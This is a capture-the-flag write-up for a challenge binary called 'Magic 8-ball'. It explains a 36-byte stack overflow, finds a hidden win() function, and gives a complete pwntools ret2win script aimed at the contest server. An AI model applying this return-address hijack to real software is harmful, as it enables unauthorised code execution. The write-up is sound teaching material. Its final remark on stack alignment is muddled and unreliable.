# Magic 8-ball

![chall](challenge.png)
![first-blood](first-blood.png)


# Ret2win

We are given a binary that asks us for a question and responds with random answers, but there is buffer-overflow vulnerabiility in the program because of a wrong buffer size read and the binary holds a function that is never called which will print out the flag. The goal is to exploit the buffer-overflow vulnerability and call the function to get the flag.


## Analysis

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // eax
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = time(0LL);
  srand(v3);
  printf("What is your question? ");
  read(0, buf, 0x64uLL);
  v4 = rand();
  puts((&answers)[v4 % (unsigned __int64)size]);
  return 0;
}
```

Looking at the decompiled pseudo-code we immediately notice that our input buffer `buf` has a size of `64 bytes` but however the read function call reads in `100 bytes, 0x64 = 100` This means that we have a `36 byte` overflow in the read function call.


### Win function

```bash
    1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND srand@GLIBC_2.2.5 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND time@GLIBC_2.2.5 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@GLIBC_2.2.5 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND rand@GLIBC_2.2.5 (2)
    29: 0000000000401170     0 FUNC    LOCAL  DEFAULT   15 deregister_tm_clones
    30: 00000000004011a0     0 FUNC    LOCAL  DEFAULT   15 register_tm_clones
    31: 00000000004011e0     0 FUNC    LOCAL  DEFAULT   15 __do_global_dtors_aux
    34: 0000000000401210     0 FUNC    LOCAL  DEFAULT   15 frame_dummy
    45: 0000000000401360     5 FUNC    GLOBAL DEFAULT   15 __libc_csu_fini
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    52: 0000000000401368     0 FUNC    GLOBAL HIDDEN    16 _fini
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.2.5
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@@GLIBC_2.2.5
    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_mai[...]
    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND srand@@GLIBC_2.2.5
    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND time@@GLIBC_2.2.5
    64: 00000000004012f0   101 FUNC    GLOBAL DEFAULT   15 __libc_csu_init
    65: 0000000000401216    23 FUNC    GLOBAL DEFAULT   15 win
    67: 0000000000401160     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_sta[...]
    68: 0000000000401130    47 FUNC    GLOBAL DEFAULT   15 _start
    70: 000000000040122d   187 FUNC    GLOBAL DEFAULT   15 main
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@@GLIBC_2.2.5
    73: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
    74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND rand@@GLIBC_2.2.5
```
Now that we have a buffer-overflow vulnerability, let's see what we can do with it. Looking at the output of `readelf -s | grep FUNC` we see one particular function that stands out and that's the `win` function. Let's see what it does

```c
int win()
{
  return system("cat flag.txt");
}
```

This is exactly what we need, now we can exploit the bufferoverflow vulnerability by overwriting `RIP` and calling the win function.

```python
#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'

if args.REMOTE:
    p = remote('ggc.tf', 31013)
else:
    p = process('./magic_8ball')

p.recvuntil('What is your question? ')
padding = b"\x90"*72
win_addr = p64(0x0000000000401216)
ret = p64(0x000000000040101a)
payload = [padding, ret, win_addr]
p.sendline(b''.join(payload))
p.interactive()
```
Notice the `ret` gadget before the call to `win_addr`? This is because we have to align the stack (stack alignment) back to 16-byte alignment. The stack pointer should always be a multiple of 8 (divisible by 8 in x64)
